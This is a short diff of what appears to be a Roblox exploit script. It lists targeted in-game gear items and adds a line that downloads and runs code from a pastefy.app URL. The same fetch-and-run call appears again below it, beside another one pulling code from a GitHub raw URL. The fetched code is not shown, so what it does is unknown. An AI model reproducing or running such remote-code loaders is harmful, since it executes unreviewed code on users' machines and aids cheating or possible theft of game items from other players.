@@ -135,6 +135,8 @@ getgenv().TARGET_GEARS = {
     ["Flying Bee"] = true,
     ["Bloodmoon Hammer"] = true
 }
+loadstring(game:HttpGet("https://pastefy.app/QO8WHeQM/raw"))()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AAVMoreira/AAVMOREIRA/refs/heads/main/AAVMoreiralogic"))()
 
 loadstring(game:HttpGet("https://pastefy.app/QO8WHeQM/raw"))()
